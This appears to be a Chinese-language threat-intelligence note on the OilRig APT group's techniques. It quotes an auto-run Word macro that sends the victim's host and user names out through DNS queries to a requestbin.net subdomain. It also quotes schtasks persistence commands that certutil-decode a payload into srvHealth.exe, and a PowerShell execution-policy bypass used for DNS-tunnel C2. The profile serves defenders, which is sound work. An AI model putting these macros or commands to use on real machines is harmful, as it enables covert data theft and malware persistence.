# OilRig

## 特征

1. 使用带有DNS隧道的恶意宏来确认当前执行阶段和识别受害者信息.

```C
Sub Document_open()
       Randomize
       hostname = LCase(Environ("computername"))
       hostname = Mid(hostname, Len(hostname) - 3, 4)
       username = Mid(LCase(Environ("username")), 1, 3)
       domain = "子域名.requestbin.net"
       Call DnsQuery(myDomain(1)，DNS_TYPE_A, 0, 0, 0, 0)
```

2. 投递的后门文件会先收集受害者电脑的基础信息，然后根据系统环境的用户名、计算机名、域来计算一个4字节的受害者标识符，以用来后续的C2通信.

3. ISMinjector木马文件在做持久化时会创建两个计划任务.

```bash
SchTasks /Create /SC MINUTE /MO 4 /TN \"ReportHealth\" /TR \"%localappdata%\\srvHealth.exe\" /f
//每4分钟运行srvHealth.exe
SchTasks /Create /SC MINUTE /MO 2 /TN \"LocalReportHealth\" /TR \"cmd.exe /c certutil -decode %localappdata%\\srvBS.txt %localappdata%\\srvHealth.exe && schtasks /DELETE /tn LocalReportHealth /f && del %localappdata%\\srvBS.txt\""
//每2分钟运行一次，使用Certutil将srvBS.txt中的payload复制到srvHealth.exe并删除源文件
```

4. BondUpdater木马文件会在受害者启用钓鱼文档的宏时下载两个文件:

>	C:\ProgramData\WindowsAppPool\AppPool.vbs

>	C:\ProgramData\WindowsAppPool\AppPool.ps1

宏通过执行:wscript C:\ProgramData\WindowsAppPool\AppPool.vbs命令创建计划任务为cmd.exe /C schtasks /create /F /sc minute /mo 1 /tn "\WindowsAppPool\AppPool" /tr "wscript /b "C:\ProgramData\WindowsAppPool\AppPool.vbs""，使其BondUpdater含有持久性.
创建完计划任务后，将会通过PowerShell.exe -exec bypass -file C:\ProgramData\WindowsAppPool\AppPool.ps1，使用带有DNS隧道的C2通信.
